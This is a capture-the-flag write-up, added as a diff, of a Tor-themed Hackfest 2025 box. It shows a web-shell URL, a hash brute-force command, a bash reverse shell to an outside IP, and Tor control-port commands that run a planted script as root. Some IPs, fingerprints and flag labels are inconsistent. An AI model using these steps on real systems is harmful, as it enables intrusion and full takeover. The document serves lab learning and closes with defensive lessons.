@@ -1,0 +1,196 @@
+Title: 2025 Hackfest SilentShadow
+Tag: CTF
+Date: 2025-10-16
+
+# Overview
+
+SilentShadow was a Tor-themed box from Hackfest 2025 (Quebec City) chaining Tor directory-authority reconnaissance, a MediaWiki file-upload vulnerability, sqlite credential extraction, a Tor control-port hashed password brute-force, and a sudo-restricted binary abused via the Tor control protocol to pop root.
+
+## Recon
+
+Initial `nmap` scan against the target revealed three open ports:
+
+```
+22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7
+80/tcp   open  tor-info Tor nodes info httpd
+8080/tcp open  http     nginx 1.22.1 ("fragment_00 - TOR research")
+```
+
+- Port 22 - OpenSSH 9.2p1
+- Port 80 - a Tor directory authority info service
+- Port 8080 - nginx serving a series of numbered "fragments" (`/fragment_00/`,
+  `/fragment_05/`, `/fragment_13/`, `/fragment_19/`...) that doled out hints
+  progressively as the challenge was solved.
+
+## Flag 1 - Tor Consensus Digging
+
+The first fragment pointed at a second host serving the Tor consensus document:
+
+```
+curl http://52.90.130.119:80/tor/status-vote/current/consensus | grep HF-
+```
+
+Grepping the consensus for the `HF-` flag prefix immediately surfaced the first flag.
+
+The same consensus data also revealed a directory authority entry:
+
+```
+dir-source daxdirauthority 445072AD7D04AA07F5CCEB35E010C341AE3AA063 52.71.194.227 52.71.194.227 80 9001
+```
+
+Fragment 13 hinted that this info needed to go into a Tor client configuration (`torrc`). Pulling the authority's own descriptor confirmed its fingerprint:
+
+```
+curl http://52.90.130.119/tor/server/authority
+router daxdirauthority 52.90.130.119 9001 0 80
+...
+fingerprint B208 FD47 B7E1 5389 7873 3E97 8839 BD75 41E5 17D8
+```
+
+## Building a Private Tor Network Client
+
+Combining the `dir-source` line, the authority fingerprint, and the v3ident gave enough to construct a custom `torrc` pointed at the challenge's own private Tor test network, rather than the public Tor network:
+
+```
+TestingTorNetwork 1
+DirAuthority daxdirauthority orport=9001 v3ident=445072AD7D04AA07F5CCEB35E010C341AE3AA063 52.71.194.227:80 CFDBE1FB005B82F54E0C68E3C3B51501AA3FBD49
+ClientOnly 1
+SocksPort 9050
+DataDirectory ./tor_data_ctf
+Log notice stdout
+```
+
+Starting Tor with this config and pointing a browser (or `curl`) at the
+resulting SOCKS proxy unlocked access to a hidden service:
+
+```
+tor -f torrc.ctf
+chromium --proxy-server="socks5://127.0.0.1:9050"
+```
+
+Fragment 19 revealed the onion address:
+
+```
+http://d4hev3ljgwkcfs53k3qhb4q523s4bwj5th2ywat7fzyjajmr3x5ameyd.onion
+```
+
+which turned out to be a Wikipedia-style site running MediaWiki.
+
+## Flag 2 - Wiki History & Recon
+
+The hidden service's page history and user contributions pages (`action=history`, `Special:Contributions`) surfaced the second flag while digging through edit history.
+
+Investigating the `User:Dax` page revealed the site admin's username and group memberships (Bureaucrats, Interface administrators, Administrators), and `Special:Version` confirmed the software: **MediaWiki 1.43.1**, with CVE-2025-32699 flagged as a possible (unverified) candidate vulnerability.
+
+## Foothold - Malicious File Upload
+
+Rather than relying on the CVE, the team registered a wiki account and found the file upload feature didn't adequately restrict uploaded file types, allowing a PHP web shell to be uploaded directly:
+
+```
+http://.../images/1/1c/Websh.php?cmd=cat%20/etc/passwd
+```
+
+This returned command execution as `www-data`, confirmed via `/etc/passwd`, which also revealed a notable local account: `relay-operator`.
+
+For easier interaction (since the target was only reachable over Tor), the team switched to querying the web shell through `curl` with SOCKS proxying:
+
+```
+curl --socks5-hostname 127.0.0.1:9050 http://.../Websh.php?cmd=<CMD>
+```
+
+## Flag 3 Setup - Credential Harvesting
+
+Listing the web root showed a `LocalSettings.php` with MediaWiki secrets (`$wgSecretKey`, `$wgUpgradeKey`) and a SQLite-backed data directory. The file `relay-operator` owned (`flag3.txt`) became the next target, pointing toward a lateral movement path to that user.
+
+Pulling strings from `/var/www/mediawiki/data/hidden_wiki.sqlite` recovered a stored credential for the wiki admin:
+
+```
+Dax:pbkdf2:sha512:30000:64:b7AOCF22wRMNfw9Ci99a5g==:qWt5gqlSEWAJVUPf8GqUUqAw09Xwf7fh/99JmURokcCohvZzjiAZzFbQRKx6ppVugBAJ6CfdG55pfQI6TUt0WQ==
+```
+
+Format: PBKDF2-HMAC-SHA512, 30,000 iterations, 64-byte derived key -
+convertible to hashcat form:
+
+```
+sha512:30000:b7AOCF22wRMNfw9Ci99a5g==:qWt5gqlSEWAJVUPf8GqUUqAw09Xwf7fh/99JmURokcCohvZzjiAZzFbQRKx6ppVugBAJ6CfdG55pfQI6TUt0WQ==
+```
+
+With the flags captured so far:
+
+- **Flag 1:** `HF-cIgSWrT6tlWGNKfxx8UPshsKnd7DdEdY`
+- **Flag 2:** `HF-fysfhvpdzdubsqnbdoeeaisnqvfheepf`
+
+## Tor Control Port Password Brute-Force
+
+Reading the Tor daemon's own configuration file exposed its hashed control port password:
+
+```
+cat /opt/tor/torrc.daxdirauthority
+```
+
+```
+ContactInfo daxdirauthority <HF-cIgSWrT6tlWGNKfxx8UPshsKnd7DdEdY>
+ControlPort 9051
+HashedControlPassword 16:B093C5EA4D895A4B60B885DE9D8192819D93BCB282FE71153777C96A7A
+```
+
+This hash format is specific to Tor and isn't crackable with standard hashcat modes. Research led to a purpose-built brute-forcer referenced in a writeup on abusing the Tor control protocol for privilege escalation:
+
+- Blog: "Privilege escalation using the Tor Control Protocol" (Medium, dax_dev)
+- Tool: `tor-hashed-control-password-brute` (GitHub, daxAKAhackerman)
+
+Cloning, compiling, and running the tool against the hash with the `rockyou.txt` wordlist recovered the control port password:
+
+```
+bin/tor-hashed-control-password-brute -t 16:B093C5EA4D895A4B60B885DE9D8192819D93BCB282FE71153777C96A7A -w /usr/share/wordlists/rockyou.txt -n 10
+```
+
+```
+password found: panda23uk
+```
+
+## Privilege Escalation Path to relay-operator
+
+Checking sudo permissions for `www-data` revealed a narrowly scoped but exploitable rule:
+
+```
+sudo -l
+```
+
+```
+User www-data may run the following commands on ip-10-17-4-140:
+    (relay-operator) NOPASSWD: /usr/bin/nyx
+```
+
+`nyx` is a Tor relay terminal status monitor. Attempts to abuse `nyx` directly as `relay-operator` for command execution were unsuccessful.
+
+Instead, the team pivoted using an SSH private key discovered earlier alongside a reverse shell payload, popping a proper interactive reverse shell rather than relying solely on the web shell:
+
+```
+/bin/bash -c 'exec bash -i &>/dev/tcp/16.52.42.55/443 <&1'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## Flag 3 - Root via Tor Control Protocol
+
+Following the same Medium article referenced earlier, the team crafted a malicious transport-plugin shell script in `/tmp` and used the recovered control port password to authenticate to the local Tor control port, then configured Tor to execute the script as a server transport plugin - which runs with the privileges of the Tor process (root in this configuration): 
+```
+telnet 127.0.0.1 9051
+AUTHENTICATE "panda23uk"
+SETCONF ServerTransportPlugin="dax exec /tmp/dax.sh"
+```
+
+This triggered execution of the planted script, yielding a **root shell** and the third flag.
+
+## Flag 4 - Root Flag
+
+With root access established, the final flag was located directly in the root home directory.
+
+## Takeaways
+
+- Tor directory authority and consensus metadata can leak enough configuration detail (fingerprints, v3idents, ORPorts) to bootstrap a client into a private/testing Tor network.
+- MediaWiki file upload restrictions must be enforced server-side; relying on client checks or extension allow-lists alone permits web shell uploads.
+- SQLite application data files can leak credential hashes via simple `strings` extraction if file permissions or backups aren't hardened.
+- Tor's `HashedControlPassword` format is non-standard and requires purpose-built tooling to brute-force - a good reminder that "not crackable by common tools" doesn't mean "not crackable."
+- Sudo rules scoped to a specific binary (like `nyx`) can still be dangerous if that binary interacts with a broader privileged interface - in this case, the Tor control port, which allowed configuring a transport plugin that executed arbitrary code as root.
+- Control ports and management interfaces (Tor's `ControlPort` included) should be tightly access-restricted and never reachable by lower-privileged accounts that can also influence the executable path.
